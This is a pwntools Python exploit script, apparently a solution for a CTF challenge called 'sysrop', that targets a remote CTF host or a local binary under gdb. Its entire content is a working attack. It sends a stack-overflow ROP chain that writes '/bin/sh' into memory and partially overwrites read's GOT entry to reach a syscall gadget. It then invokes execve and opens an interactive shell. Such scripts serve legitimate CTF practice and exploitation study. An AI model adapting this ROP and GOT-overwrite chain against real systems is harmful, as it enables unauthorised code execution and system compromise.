from pwn import *

if __debug__:
	p=gdb.debug('./sysrop','b* 0x4005f2')
	#p=process('./sysrop')
	syscall = '\x5f'
else:
	p=remote('ctf.j0n9hyun.xyz', 3024)
	syscall = '\x5e'

read_plt=0x4004b0
read_got=0x601018
data=0x601030
binsh="/bin/sh\x00"
pppr=0x4005eb #rdx rdi rsi
#syscall=0x5e
ppppr=0x4005ea #rax rdx rdi rsi
main=0x4005f2

payload='a'*(0x10+8)+p64(pppr)+p64(len(binsh))+p64(0)+p64(data)+p64(read_plt)+p64(main)
#data <- binsh
payload2='a'*(0x10+8)+p64(pppr)+p64(1)+p64(0)+p64(read_got)+p64(read_plt)

payload2+=p64(ppppr)+p64(59)+p64(0)+p64(data)+p64(0)+p64(read_plt)

p.send(payload.ljust(0x78))
p.send(binsh)
p.send(payload2.ljust(0x78))
p.send(syscall)
p.interactive()
p.close()